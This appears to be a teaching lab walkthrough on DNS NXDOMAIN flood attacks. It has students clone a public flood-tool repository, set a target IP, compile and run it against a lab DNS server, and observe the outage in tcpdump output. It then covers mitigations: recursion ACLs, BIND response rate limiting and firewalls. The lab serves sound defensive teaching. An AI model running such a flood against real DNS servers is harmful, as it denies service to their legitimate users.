A common DNS Denial-of-Service attack is NXDOMAIN attack.
`NXDOMAIN` (Non eXistent DOMAIN) is the error you receive when checking for an nonexistent domain name:

```bash
$ host magic.scgc.ro
Host magic.scgc.ro not found: 3(NXDOMAIN)
```
When flooding a DNS Server with unique requests that will return `NXDOMAIN`, you
may make the server unavailable for legitimate requests.

We will see how to make a denial of service attack on a DNS server.
You will need to open three terminals to the host (SCGC Template).
For the sake of this task, enable recursion for the helper VM.

Connect to the helper VM.
Clone the following repository and change the working directory:

```bash
$ git clone https://github.com/shiroe41/DNS-NXDOMAIN-FLood-Attack
$ cd DNS-NXDOMAIN_FLood-Attack/src
```

Modify the source code to use your DNS server IP address and compile the code:

```bash
$ grep dest_sock_addr.sin_addr.s_addr dos_attack.c
    dest_sock_addr.sin_addr.s_addr = inet_addr("192.168.1.1");  /* target DNS server ip address */
    ip_header->ip_dst.s_addr = dest_sock_addr.sin_addr.s_addr;
$ gcc -o dos_attack dos_attack.c
```

Interrogate your DNS server to check if everything works fine (both from the base VM and from the helper VM):

```bash
$ host scgc.ro dns
Using domain server:
Name: 192.168.1.1
Address: 192.168.1.1#53
Aliases:

scgc.ro mail is handled by 42 mail.scgc.ro.
scgc.ro mail is handled by 60 mail2.scgc.ro.
```

From the base VM, run `tcpdump`:

```bash
$ sudo tcpdump -i br0 udp port 53 # we check only the DNS traffic
```

From the first terminal, start the attack:

```bash
$ sudo ./dos_attack
```

While the attack is running, from the base VM, test the DNS server:

```bash
$ host scgc.ro 192.168.1.1
Using domain server:
Name: 192.168.1.1
Address: 192.168.1.1#53
Aliases:

;; connection timed out; no servers could be reached
```
The server will hardly respond or will fail.

Stop the attack and the tcpdump. Inspect the tcpdump output:

```bash
...
23:26:48.364788 IP 10.0.2.20.29264 > 192.168.1.1.domain: 40664+ A? idcdy.fuawv.lulix. (35)
23:26:48.364829 IP 10.0.2.20.8518 > 192.168.1.1.domain: 11612+ A? lsrae.olszf.lkttp. (35)
23:26:48.364870 IP 10.0.2.20.46214 > 192.168.1.1.domain: 28079+ A? ctqzq.bvblt.xltqp. (35)

^C
760212 packets captured
1864674 packets received by filter
1104462 packets dropped by kernel
```

We can see that a high number of packages were sent to the DNS server in a short time.
Pay attention to the DNS requests: all the domains are randomly generated.

A mitigation method is to allow recursion only for some hosts.
You can either remove the helper VM from the ACL list or disable recursion.
Redo the steps above and check the new behaviour.
Even though the DNS Server does not make any more recursive queries and the
attacker's queries are refused, the server is still flooded and unavailable.

Another workaround is to limit the response rate. By adding the following lines in
your `/etc/bind/named.conf.options` file, you can limit the number of unique responses
that are delivered each second:

```
...
options {
...

	rate-limit {
		responses-per-second 20;
	};
...
};
```

Restart bind and redo the attack steps. You can see in the tcpdump output that the
DNS server ignores the queries from the helper network, and legitimate queries are resolved.
However, you should be careful when you set this option since it may affect legitimate traffic
(depending on your expected traffic).

:::important
Usually, the best way to mitigate these attacks is to use a firewall. You can set your DNS server
behind a dedicated firewall (CISCO, FortiGate, Juniper, PaloAlto, pfSense, MikroTik) or use a software
firewall on your server.
:::
